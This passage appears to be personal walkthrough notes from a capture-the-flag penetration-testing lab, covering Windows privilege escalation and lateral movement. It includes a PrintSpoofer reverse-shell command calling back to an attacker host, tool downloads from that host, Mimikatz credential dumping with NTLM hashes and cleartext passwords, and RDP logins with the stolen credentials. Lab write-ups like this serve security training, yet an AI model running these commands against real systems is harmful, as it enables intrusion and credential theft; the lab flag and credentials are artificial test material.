```bash
iwr -uri http://10.10.14.51/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
iwr -uri http://10.10.14.51/nc64.exe -Outfile nc64.exe

.\PrintSpoofer64.exe -c "nc64.exe 10.10.14.51 8888 -e powershell"
```
=> BINGO! System shell

```bash
cat C:\Users\Administrator\Desktop\flag.txt
DANTE{D0nt_M3ss_With_MinatoTW}
```

# Mimikatz

```powershell
iwr -uri http://10.10.14.51/mimikatz.exe -Outfile mimikatz.exe
```

Mimikatz commands:
```
privilege::debug
sekurlsa::logonpasswords
```

Creds:
```
* Username : Administrator
* Domain   : DANTE-WS03
* NTLM     : c55ed3c3d34c4576bcd33c76420be934

* Username : blake
* Domain   : DANTE-WS03
* NTLM     : 86f16efeb6f8187fa52f3f729896bff7

Secret  : DefaultPassword
cur/text: G_3tting_h1tched!_admin

Secret  : _SC_Apache / service 'Apache' with username : .\blake
cur/text: G_3tting_h1tched!_user
```

# RPC

```bash
xfreerdp /u:Administrator /p:'G_3tting_h1tched!_admin' /v:172.16.1.102 /cert:ignore +clipboard /dynamic-resolution
# Successful login as administrator

xfreerdp /u:blake /p:'G_3tting_h1tched!_user' /v:172.16.1.102 /cert:ignore +clipboard /dynamic-resolution
# Failed login as blake
```

# MySQL

Upload static binary:
```powershell
iwr -uri http://10.10.14.51/mysql.exe -Outfile mysql.exe
```

Port 3306 and Port 33060
```
# define('DB_USER','root');
# define('DB_PASS','Welcome1!');
```
=> nope
